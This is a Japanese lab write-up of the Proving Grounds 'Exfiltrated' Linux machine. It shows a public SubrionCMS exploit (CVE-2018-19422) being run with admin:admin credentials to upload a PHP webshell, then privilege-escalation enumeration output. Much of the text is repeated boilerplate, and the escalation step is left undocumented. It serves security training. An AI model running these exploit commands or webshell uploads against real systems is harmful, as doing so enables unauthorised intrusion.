---
title: "Proving Grounds - Exfiltrated (Linux)"
date: 2026-02-25
description: "Proving Grounds Exfiltrated Linux マシン解説。偵察・初期アクセス・権限昇格を解説。"
categories: [Proving Grounds, Linux]
tags: [rce, suid, php, privilege-escalation]
mermaid: true
content_lang: ja
alt_en: /posts/pg-exfiltrated/
---

## 概要

| 項目 | 内容 |
|---------------------------|-------|
| OS | Linux |
| 難易度 | 記録なし |
| 攻撃対象 | Webアプリケーションおよび公開されたネットワークサービス |
| 主な侵入経路 | Web RCE (CVE-2018-19422, CVE-2021-22204) |
| 権限昇格経路 | ローカル列挙 -> 設定ミスの悪用 -> root |

## 認証情報

認証情報なし。

## 偵察

---
💡 なぜ有効か
このフェーズでは到達可能な攻撃対象領域を把握し、悪用が成功しやすい箇所を特定します。正確なサービスおよびコンテンツの探索により、無駄な試行を減らし、的を絞った後続アクションを導きます。

## 初期足がかり

---
![Screenshot from the exfiltrated engagement](/assets/img/pg/exfiltrated/Pasted%20image%2020260122004134.png)
*キャプション：このフェーズで取得したスクリーンショット*

![Screenshot from the exfiltrated engagement](/assets/img/pg/exfiltrated/Pasted%20image%2020260122011811.png)
*キャプション：このフェーズで取得したスクリーンショット*

![Screenshot from the exfiltrated engagement](/assets/img/pg/exfiltrated/Pasted%20image%2020260122012911.png)
*キャプション：このフェーズで取得したスクリーンショット*

リバースシェルのコールバックが成功しました：
https://github.com/hev0x/CVE-2018-19422-SubrionCMS-RCE
攻撃チェーンを進め、次の仮説を検証するために以下のコマンドを実行します。オープンサービス、悪用可否、認証情報の露出、権限境界などの指標を確認します。コマンドとパラメータはそのまま記録し、追試できる形を維持します。

```bash
python3 SubrionRCE.py -u http://exfiltrated.offsec/panel/ -l admin -p admin
```

```bash
✅[1:29][CPU:3][MEM:70][TUN0:192.168.45.178][...2018-19422-SubrionCMS-RCE]
🐉 > python3 SubrionRCE.py -u http://exfiltrated.offsec/panel/ -l admin -p admin
[+] SubrionCMS 4.2.1 - File Upload Bypass to RCE - CVE-2018-19422

[+] Trying to connect to: http://exfiltrated.offsec/panel/
[+] Success!
[+] Got CSRF token: esVHdLZTvKAZetNpW8hrGLNYZHY11rUHtypp8j1Y
[+] Trying to log in...
[+] Login Successful!

[+] Generating random name for Webshell...
[+] Generated webshell name: uxwwjimknozsrki

[+] Trying to Upload Webshell..
[+] Upload Success... Webshell path: http://exfiltrated.offsec/panel/uploads/uxwwjimknozsrki.phar

$

```

![Screenshot from the exfiltrated engagement](/assets/img/pg/exfiltrated/Pasted%20image%2020260122015414.png)
*キャプション：このフェーズで取得したスクリーンショット*

攻撃チェーンを進め、次の仮説を検証するために以下のコマンドを実行します。オープンサービス、悪用可否、認証情報の露出、権限境界などの指標を確認します。コマンドとパラメータはそのまま記録し、追試できる形を維持します。

```bash
php -e ./uxwwjimknozsrki.phar
```

```bash
$ php -e ./uxwwjimknozsrki.phar
```

💡 なぜ有効か
初期アクセスのステップでは、発見した弱点を連鎖させ、対象に対する実行可能な制御を確立します。足がかりの成功は、コマンド実行またはインタラクティブなシェルのコールバックによって検証されます。

## 権限昇格

---
攻撃チェーンを進め、次の仮説を検証するために以下のコマンドを実行します。オープンサービス、悪用可否、認証情報の露出、権限境界などの指標を確認します。コマンドとパラメータはそのまま記録し、追試できる形を維持します。

```bash
════════════════════════════╣ Other Interesting Files ╠════════════════════════════
                            ╚═════════════════════════╝
╔══════════╣ .sh files in path
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#scriptbinaries-in-path
/usr/bin/gettext.sh
/usr/bin/rescan-scsi-bus.sh

╔══════════╣ Executable files potentially added by user (limit 70)
2021-06-10+12:06:15.4750619470 /opt/image-exif.sh

╔══════════╣ Unexpected in /opt (usually empty)
total 16
drwxr-xr-x  3 root root 4096 Jun 10  2021 .
drwxr-xr-x 20 root root 4096 Jan  7  2021 ..
-rwxr-xr-x  1 root root  437 Jun 10  2021 image-exif.sh
drwxr-xr-x  2 root root 4096 Jun 10  2021 metadata

```

攻撃チェーンを進め、次の仮説を検証するために以下のコマンドを実行します。オープンサービス、悪用可否、認証情報の露出、権限境界などの指標を確認します。コマンドとパラメータはそのまま記録し、追試できる形を維持します。

追加ログなし。

💡 なぜ有効か
権限昇格はローカルの設定ミス、安全でないパーミッション、信頼された実行パスに依存します。これらの信頼境界を列挙して悪用することが、rootレベルのアクセスへの最短経路です。

## まとめ・学んだこと

- 本番同等の環境でフレームワークのデバッグモードとエラー露出を検証する。
- 特権ユーザーやスケジューラーが実行するスクリプト・バイナリのファイルパーミッションを制限する。
- ワイルドカード展開やスクリプト化可能な特権ツールを避けるため sudo ポリシーを強化する。
- 露出した認証情報と環境ファイルを重要機密として扱う。

## 参考文献

- CVE-2018-19422: https://nvd.nist.gov/vuln/detail/CVE-2018-19422
- CVE-2021-22204: https://nvd.nist.gov/vuln/detail/CVE-2021-22204
- RustScan: https://github.com/RustScan/RustScan
- Nmap: https://nmap.org/
- feroxbuster: https://github.com/epi052/feroxbuster
- Nuclei: https://github.com/projectdiscovery/nuclei
- GTFOBins: https://gtfobins.org/
- HackTricks Privilege Escalation: https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html
